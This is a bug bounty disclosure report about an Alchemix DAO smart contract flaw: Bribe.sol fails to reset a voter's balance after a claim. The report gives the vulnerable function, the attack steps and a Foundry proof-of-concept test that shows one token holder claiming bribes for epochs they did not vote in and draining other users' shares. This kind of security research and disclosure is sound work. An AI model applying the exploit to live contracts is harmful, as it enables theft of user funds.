# 31526 - \[SC - Critical] A user is able to claim more bribes than they h...

Submitted on May 21st 2024 at 02:09:30 UTC by @hulkvision for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31526

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
* A user is be able to claim more bribes than they have earned

## Description

## Brief/Intro

A user is able to claim more bribes than they have earned by claiming bribes for epochs they have not voted in.

## Vulnerability Details

A user can claim bribes in next epoch for epochs they have voted in and once they have claimed bribes for the previous epoch they should not be able to claim bribes again without voting or poke.

The issue is when user claims the bribe reward for an epoch instead of balance of user getting reset, the balance of user remains unchanged and this allows user to claim bribe reward even for epochs they have not voted in.

In `Bribe.sol`

```solidity
function getRewardForOwner(uint256 tokenId, address[] memory tokens) external lock { 
        require(msg.sender == voter, "not voter");
        address _owner = IVotingEscrow(veALCX).ownerOf(tokenId);
        uint256 length = tokens.length;
        for (uint256 i = 0; i < length; i++) {
            uint256 _reward = earned(tokens[i], tokenId);

            require(_reward > 0, "no rewards to claim");

            lastEarn[tokens[i]][tokenId] = block.timestamp;

            _writeCheckpoint(tokenId, balanceOf[tokenId]); //@audit-issue balanceOf[tokenId] does reset to zero after claiming bribe and checkpoint is created with previous balance.

            IERC20(tokens[i]).safeTransfer(_owner, _reward);

            emit ClaimRewards(_owner, tokens[i], _reward);
        }
    }
```

> Steps for Attack

* User A and User B(BlackHat) create two tokenId with same amount and maxLock enabled.
* In Epoch 1 Both User A and User B(BlackHat) votes by calling `vote` function in `Voter.sol` thus becoming eligible for claiming bribes in epoch 2.
* In Epoch 2 Both User A and User B claims bribe and only user A votes in epoch 2 so only User A should become eligible for claiming bribe in epoch 3 .
* In Epoch 3 User B claims bribe by calling `claimBribes` from `Voter.sol` here user B should not be able to claim bribe in epoch 3 because user B has already claimed bribe for voting in Epoch 1 in Epoch 2 and did not voted again in Epoch 3 but user B was able to claim bribe because of the vulnerability.

## Impact Details

* One of the assumed invariant set by Team has been broken

> A user should never be able to claim more bribes than they have earned

* BlackHat can also prevent some users from claiming their share of bribe by calling `claimBribes` before them and stealing their share of bribes.

## References

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Bribe.sol#L283-300>

## Proof of Concept

* Add this test to `src/test/Voting.t.sol` and run with `forge test --mt testPOCVoteOnceAndClaimBribes() --rpc-url $RPC_URL -vvvv`

```
function testPOCVoteOnceAndClaimBribes() public {
        uint256 tokenId1 = createVeAlcx(admin, TOKEN_1, MAXTIME, true); // this user will be inconsistent in voting and claiming
        uint256 tokenId2 = createVeAlcx(beef, TOKEN_1, MAXTIME, true); //this will actively participate in voting

        
        address bribeAddress = voter.bribes(address(sushiGauge));
        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        address[] memory bribes = new address[](1);
        bribes[0] = address(bribeAddress);
        address[][] memory tokens = new address[][](1);
        tokens[0] = new address[](1);
        tokens[0][0] = bal;

        // add bribes
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

        //first epoch
        hevm.prank(admin);
        voter.vote(tokenId1, pools, weights, 0);

        hevm.prank(beef);
        voter.vote(tokenId2, pools, weights, 0);

        //2nd epoch
        hevm.warp(newEpoch());
        voter.distribute();
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

        // only admin voted and beef did not voted in epoch2
        hevm.prank(admin);
        voter.vote(tokenId1, pools, weights, 0);

        hevm.prank(admin);
        voter.claimBribes(bribes, tokens, tokenId1);

        // beef has claimed his bribes for voting in epoch 1 and did not voted in epoch 2
        hevm.prank(beef);
        voter.claimBribes(bribes, tokens, tokenId2);

        uint256 balanceEnd1 = IERC20(bal).balanceOf(bribeAddress);

        //bribe address should have 100k token which was deposited at the start of 2nd epoch
        assertEq(balanceEnd1,TOKEN_100K,"bribeAddress should have 100k which was deposited at the start of 2nd epoch");

        // 3rd epoch
        hevm.warp(newEpoch());
        voter.distribute();
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K); // this will be used in epoch 4

        //beef did not voted in  epoch 2 and already claimed bribe in epoch2 for voting in epoch1, so this should have reverted
        hevm.prank(beef);
        voter.claimBribes(bribes, tokens, tokenId2);
        console.log("beef  claimed bribe twice without voting or poke",IERC20(bal).balanceOf(beef));

        // admin voted in epoch 3
        hevm.prank(admin);
        voter.claimBribes(bribes, tokens, tokenId1);

        
        //4th epoch 
        hevm.warp(newEpoch());
        voter.distribute();
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

        //beef immediately claimed bribe in the begining of epoch 4
        hevm.prank(beef);
        voter.claimBribes(bribes, tokens, tokenId2);

        hevm.prank(admin);
        // it will revert because of insufficient balance in bribe contract because beef has claimed bribe before admin
        vm.expectRevert(); 
        voter.claimBribes(bribes, tokens, tokenId1);

    }

```
